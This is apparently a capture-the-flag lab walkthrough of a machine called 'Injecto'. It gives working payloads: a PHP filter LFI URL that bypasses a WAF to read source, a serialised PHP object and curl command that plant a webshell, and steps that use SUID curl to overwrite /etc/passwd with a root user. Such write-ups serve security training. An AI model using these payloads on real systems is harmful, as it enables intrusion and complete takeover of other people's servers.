# Injecto

## Gaining Access

Nmap scan:

```
$ nmap -p- --min-rate 3000 192.168.183.173
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-11 23:05 +08
Nmap scan report for 192.168.183.173
Host is up (0.17s latency).
Not shown: 65532 closed tcp ports (conn-refused)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
8080/tcp open  http-proxy
```

### Web Enum --> PHP LFI

Port 80 shows a simple quiz application:

<figure><img src="../../../.gitbook/assets/image (1629).png" alt=""><figcaption></figcaption></figure>

If we click any of the buttons, we are shown a very obvious LFI.

<figure><img src="../../../.gitbook/assets/image (194).png" alt=""><figcaption></figcaption></figure>

Attempting to do anything with it results in being blocked by a WAF.

<figure><img src="../../../.gitbook/assets/image (1560).png" alt=""><figcaption></figcaption></figure>

We can confirm that the website runs on PHP by visiting `index.php` and being shown the same page. Then, I experimented with some PHP Filter LFI exploits for the `blackdeath` page.

<figure><img src="../../../.gitbook/assets/image (198).png" alt=""><figcaption></figcaption></figure>

The WAF is easily bypassed as long as we include it within the `page` parameter. We can read the code of `index.php` by visiting:

{% code overflow="wrap" %}
```
http://192.168.183.173/index.php?page=php://filter/convert.base64-encode/resource=blackdeath/../../../../../var/www/html/index
```
{% endcode %}

<figure><img src="../../../.gitbook/assets/image (3152).png" alt=""><figcaption></figcaption></figure>

Here's the PHP code:

```php
<?php
            function containsStr($str, $substr) {
                return strpos($str, $substr) !== false;
            }
                $extension = '.php';
            if(isset($_GET['page'])) {
                if(containsStr($_GET['page'], 'blackdeath') || containsStr($_GET['page'], 'coronavirus')) {
                    include $_GET['page'] . $extension;
                } else {
                    echo 'Tampering Detected!';
                }
            }
?>
```

### Source Code Review --> Deserialisation

We can read the `index.php` file of the `nginx` configuration here:

```
http://192.168.183.173/index.php?page=php://filter/convert.base64-encode/resource=blackdeath/../../../../../../usr/share/nginx/html/index
```

Here's the PHP code:

```php
<?php
            class MyClass {
            
            public $form_file = 'msgwithres.txt';
            public $msgo = '';
            
            public function Savemsgo() {
            
            $researcher_name = $_GET['name']; 
            $researcher_email = $_GET['email'];
            $respo = $_GET['comments'];
            
                $this-> msgo = "msgo: " . $researcher_name . " || Email : " . $researcher_email . " || Comment: " . $respo . "\n";
            
            }
            public function __destruct() { 
            file_put_contents(__DIR__ . '/' . $this->form_file,$this->msgo,FILE_APPEND);
            echo 'Saved! :)';
            }
            }
            $values_submit = $_GET['values_submit'] ?? '';
            $msgovalues_submit = unserialize($values_submit);
            
            $webApp = new MyClass;
            $webApp -> Savemsgo();
?>
```

This PHP runs for the service on port 8080. The vulnerability here is the fact that the website deserialises the output we generate.&#x20;

We can then submit a GET requests with this payload:

```php
O:7:"MyClass":2:{s:9:"form_file";s:8:"test.php";s:4:"msgo";s:29:"<?php+system($_GET['cmd']);?>";}
```

This would output a webshell on the machine for us to execute commands from. To submit it, we can just use this `curl` command:

```bash
$ curl "http://192.168.183.173:8080/index.php?values_submit=O:7:%22MyClass%22:2:%7Bs:9:%22form_file%22;s:8:%22test.php%22;s:4:%22msgo%22;s:29:%22%3C?php+system(\$_GET%5B'cmd'%5D);?%3E%22;%7D"
```

Then, we can verify that we have RCE:

<figure><img src="../../../.gitbook/assets/image (1060).png" alt=""><figcaption></figcaption></figure>

Getting reverse shell using the usual `bash` one-liner is easy:

<figure><img src="../../../.gitbook/assets/image (1870).png" alt=""><figcaption></figcaption></figure>

## Privilege Escalation

### Curl SUID --> Overwrite /etc/passwd

I searched for SUID binaries, and found that `curl` was one of them:

```
www-data@injectocurly:/$ find / -perm -u=s -type f 2>/dev/null
/usr/bin/curl
```

This means we can overwrite any file. To get a `root` shell, we can overwrite the `/etc/passwd` file. First, generate a valid hash:

```
$ openssl passwd -1 hello   
$1$wsCz0GNf$0S8e55RreE.iCJIyEr3jP.
```

Afterwards, just copy the `/etc/passwd` file and append this line:

```
hacker:$1$wsCz0GNf$0S8e55RreE.iCJIyEr3jP.:0:0::/root:/bin/sh
```

Then, host the new `passwd` file on a HTTP server and `curl` it, directing the output to `/etc/passwd`. Afterwards, `su` to the new user to get `root`:

<figure><img src="../../../.gitbook/assets/image (3415).png" alt=""><figcaption></figcaption></figure>

Rooted!
